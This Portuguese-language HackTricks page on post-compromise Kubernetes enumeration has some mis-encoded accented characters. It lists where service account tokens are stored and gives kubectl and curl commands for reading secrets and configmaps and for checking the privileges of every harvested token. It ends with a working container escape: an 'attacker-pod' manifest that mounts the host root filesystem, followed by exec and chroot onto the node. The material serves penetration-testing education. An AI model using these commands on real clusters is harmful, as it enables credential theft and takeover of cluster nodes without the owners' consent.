# Enumera√ß√£o do Kubernetes

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs exclusivos**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Tokens do Kubernetes

Se voc√™ comprometeu o acesso a uma m√°quina, o usu√°rio pode ter acesso a alguma plataforma Kubernetes. O token geralmente est√° localizado em um arquivo apontado pela **vari√°vel de ambiente `KUBECONFIG`** ou **dentro de `~/.kube`**.

Nesta pasta, voc√™ pode encontrar arquivos de configura√ß√£o com **tokens e configura√ß√µes para se conectar ao servidor API**. Nesta pasta, voc√™ tamb√©m pode encontrar uma pasta de cache com informa√ß√µes previamente recuperadas.

Se voc√™ comprometeu um pod dentro de um ambiente Kubernetes, existem outros lugares onde voc√™ pode encontrar tokens e informa√ß√µes sobre o ambiente K8 atual:

### Tokens de Conta de Servi√ßo

Antes de continuar, se voc√™ n√£o sabe o que √© um servi√ßo no Kubernetes, sugiro que **siga este link e leia pelo menos as informa√ß√µes sobre a arquitetura do Kubernetes.**

Retirado da [documenta√ß√£o](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server) do Kubernetes:

_‚ÄúQuando voc√™ cria um pod, se n√£o especificar uma conta de servi√ßo, ele √© automaticamente atribu√≠do √† conta de servi√ßo_ padr√£o _no mesmo namespace.‚Äù_

**ServiceAccount** √© um objeto gerenciado pelo Kubernetes e usado para fornecer uma identidade para processos que executam em um pod.\
Cada conta de servi√ßo tem um segredo relacionado a ela e este segredo cont√©m um token de portador. Este √© um JSON Web Token (JWT), um m√©todo para representar reivindica√ß√µes de forma segura entre duas partes.

Geralmente **um** dos diret√≥rios:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

cont√©m os arquivos:

* **ca.crt**: √â o certificado ca para verificar as comunica√ß√µes do Kubernetes
* **namespace**: Indica o namespace atual
* **token**: Cont√©m o **token de servi√ßo** do pod atual.

Agora que voc√™ tem o token, voc√™ pode encontrar o servidor API dentro da vari√°vel de ambiente **`KUBECONFIG`**. Para mais informa√ß√µes, execute `(env | set) | grep -i "kuber|kube`**`"`**

O token da conta de servi√ßo est√° sendo assinado pela chave que reside no arquivo **sa.key** e validado por **sa.pub**.

Localiza√ß√£o padr√£o no **Kubernetes**:

* /etc/kubernetes/pki

Localiza√ß√£o padr√£o no **Minikube**:

* /var/lib/localkube/certs

### Hot Pods

_**Hot pods s√£o**_ pods que cont√™m um token de conta de servi√ßo privilegiado. Um token de conta de servi√ßo privilegiado √© um token que tem permiss√£o para realizar tarefas privilegiadas, como listar segredos, criar pods, etc.

## RBAC

Se voc√™ n√£o sabe o que √© **RBAC**, **leia esta se√ß√£o**.

## CheatSheet de Enumera√ß√£o

Para enumerar um ambiente K8s, voc√™ precisa de algumas coisas:

* Um **token de autentica√ß√£o v√°lido**. Na se√ß√£o anterior, vimos onde procurar um token de usu√°rio e um token de conta de servi√ßo.
* O **endere√ßo (**_**https://host:port**_**) do API Kubernetes**. Isso geralmente pode ser encontrado nas vari√°veis de ambiente e/ou no arquivo de configura√ß√£o do kube.
* **Opcional**: O **ca.crt para verificar o servidor API**. Isso pode ser encontrado nos mesmos lugares que o token. Isso √© √∫til para verificar o certificado do servidor API, mas usando `--insecure-skip-tls-verify` com `kubectl` ou `-k` com `curl`, voc√™ n√£o precisar√° disso.

Com esses detalhes, voc√™ pode **enumerar o Kubernetes**. Se o **API** por algum motivo estiver **acess√≠vel** pela **Internet**, voc√™ pode simplesmente baixar essas informa√ß√µes e enumerar a plataforma do seu host.

No entanto, geralmente o **servidor API est√° dentro de uma rede interna**, portanto, voc√™ precisar√° **criar um t√∫nel** atrav√©s da m√°quina comprometida para acess√°-lo do seu computador, ou voc√™ pode **fazer upload do bin√°rio** [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux), ou usar **`curl/wget/qualquer coisa`** para realizar solicita√ß√µes HTTP brutas ao servidor API.

### Diferen√ßas entre os verbos `list` e `get`

Com permiss√µes de **`get`**, voc√™ pode acessar informa√ß√µes de ativos espec√≠ficos (_op√ß√£o `describe` no `kubectl`_) API:
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
Se voc√™ tem a permiss√£o **`list`**, voc√™ est√° autorizado a executar solicita√ß√µes de API para listar um tipo de ativo (_op√ß√£o `get` em `kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
Se voc√™ tem a permiss√£o **`watch`**, voc√™ est√° autorizado a executar solicita√ß√µes de API para monitorar ativos:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
Eles abrem uma conex√£o de streaming que retorna o manifesto completo de um Deployment sempre que ele muda (ou quando um novo √© criado).

{% hint style="danger" %}
Os seguintes comandos `kubectl` indicam apenas como listar os objetos. Se voc√™ quiser acessar os dados, precisa usar `describe` em vez de `get`
{% endhint %}

### Usando curl

De dentro de um pod, voc√™ pode usar v√°rias vari√°veis de ambiente:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
Por padr√£o, o pod pode **acessar** o **kube-api server** no nome de dom√≠nio **`kubernetes.default.svc`** e voc√™ pode ver a rede kube em **`/etc/resolv.config`**, pois aqui voc√™ encontrar√° o endere√ßo do servidor DNS do kubernetes (o ".1" do mesmo intervalo √© o endpoint do kube-api).
{% endhint %}

### Usando kubectl

Tendo o token e o endere√ßo do servidor API, voc√™ usa kubectl ou curl para acess√°-lo conforme indicado aqui:

Por padr√£o, o APISERVER est√° se comunicando com o esquema `https://`
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> se n√£o houver `https://` na URL, voc√™ pode receber um erro como Solicita√ß√£o Incorreta.

Voc√™ pode encontrar uma [**folha de dicas oficial do kubectl aqui**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). O objetivo das se√ß√µes a seguir √© apresentar de maneira ordenada diferentes op√ß√µes para enumerar e entender o novo K8s ao qual voc√™ obteve acesso.

Para encontrar a requisi√ß√£o HTTP que o `kubectl` envia, voc√™ pode usar o par√¢metro `-v=8`

#### MitM kubectl - Proxyfying kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Configura√ß√£o Atual

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

Se voc√™ conseguiu roubar algumas credenciais de usu√°rios, voc√™ pode **configur√°-las localmente** usando algo como:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Obter Recursos Suportados

Com esta informa√ß√£o, voc√™ saber√° todos os servi√ßos que pode listar

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{% endtab %}
{% endtabs %}

### Obter Privil√©gios Atuais

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

Outra forma de verificar seus privil√©gios √© usando a ferramenta: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

Voc√™ pode aprender mais sobre **Kubernetes RBAC** em:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Uma vez que voc√™ saiba quais privil√©gios** possui, consulte a seguinte p√°gina para descobrir **se voc√™ pode abusar deles** para escalar privil√©gios:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Obter Outros pap√©is

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### Obter namespaces

Kubernetes suporta **m√∫ltiplos clusters virtuais** respaldados pelo mesmo cluster f√≠sico. Esses clusters virtuais s√£o chamados de **namespaces**.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{% endtab %}
{% endtabs %}

### Obter segredos

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

Se voc√™ pode ler secrets, voc√™ pode usar as seguintes linhas para obter os privil√©gios relacionados a cada token:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Obter Contas de Servi√ßo

Como discutido no in√≠cio desta p√°gina, **quando um pod √© executado, geralmente uma conta de servi√ßo √© atribu√≠da a ele**. Portanto, listar as contas de servi√ßo, suas permiss√µes e onde est√£o sendo executadas pode permitir que um usu√°rio eleve seus privil√©gios.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{% endtab %}
{% endtabs %}

### Obter Deployments

Os deployments especificam os **componentes** que precisam ser **executados**.

{% tabs %}
{% tab title="kubectl" %}
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### Obter Pods

Os Pods s√£o os **containers** que ser√£o **executados**.

{% tabs %}
{% tab title="kubectl" %}
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### Obter Servi√ßos

Os **servi√ßos** Kubernetes s√£o usados para **expor um servi√ßo em uma porta e IP espec√≠ficos** (que atuar√£o como balanceador de carga para os pods que est√£o realmente oferecendo o servi√ßo). Isso √© interessante para saber onde voc√™ pode encontrar outros servi√ßos para tentar atacar.

{% tabs %}
{% tab title="kubectl" %}
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### Obter n√≥s

Obtenha todos os **n√≥s configurados dentro do cluster**.

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### Obter DaemonSets

**DaemonSets** permitem garantir que um **pod espec√≠fico esteja executando em todos os n√≥s** do cluster (ou nos selecionados). Se voc√™ deletar o DaemonSet, os pods gerenciados por ele tamb√©m ser√£o removidos.

{% tabs %}
{% tab title="kubectl" %}
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

### Obter cronjob

Cron jobs permitem agendar, usando a sintaxe semelhante a crontab, o lan√ßamento de um pod que executar√° alguma a√ß√£o.

{% tabs %}
{% tab title="kubectl" %}
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
### Obter configMap

configMap sempre cont√©m muitas informa√ß√µes e arquivos de configura√ß√£o que fornecem para aplicativos que rodam no kubernetes. Geralmente, voc√™ pode encontrar muitas senhas, segredos, tokens que s√£o usados para conectar e validar com outros servi√ßos internos/externos.

{% tabs %}

{% tab title="kubectl" %}
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
{% endtab %}

{% endtabs %}


### Obter "todos"

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
{% endtab %}
{% endtabs %}

### **Obter consumo dos Pods**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### Escapando do pod

Se voc√™ consegue criar novos pods, pode ser poss√≠vel escapar deles para o n√≥. Para fazer isso, voc√™ precisa criar um novo pod usando um arquivo yaml, mudar para o pod criado e, em seguida, fazer chroot no sistema do n√≥. Voc√™ pode usar pods existentes como refer√™ncia para o arquivo yaml, pois eles mostram imagens e caminhos existentes.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> se voc√™ precisar criar um pod em um n√≥ espec√≠fico, voc√™ pode usar o seguinte comando para obter r√≥tulos no n√≥
>
> `k get nodes --show-labels`
>
> Comumente, kubernetes.io/hostname e node-role.kubernetes.io/master s√£o bons r√≥tulos para sele√ß√£o.
>
> [refer√™ncia]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

Ent√£o voc√™ cria seu arquivo attack.yaml
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
```markdown
[fonte original yaml](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

Depois disso, voc√™ cria o pod
```
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Agora voc√™ pode alternar para o pod criado da seguinte forma
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
E finalmente voc√™ faz chroot no sistema do n√≥
```bash
chroot /root /bin/bash
```
Informa√ß√µes obtidas de: [Kubernetes Namespace Breakout usando Insecure Host Path Volume ‚Äî Parte 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Atacando e Defendendo Kubernetes: Bust-A-Kube ‚Äì Epis√≥dio 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## Refer√™ncias

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

<details>

<summary><strong>Aprenda hacking em AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
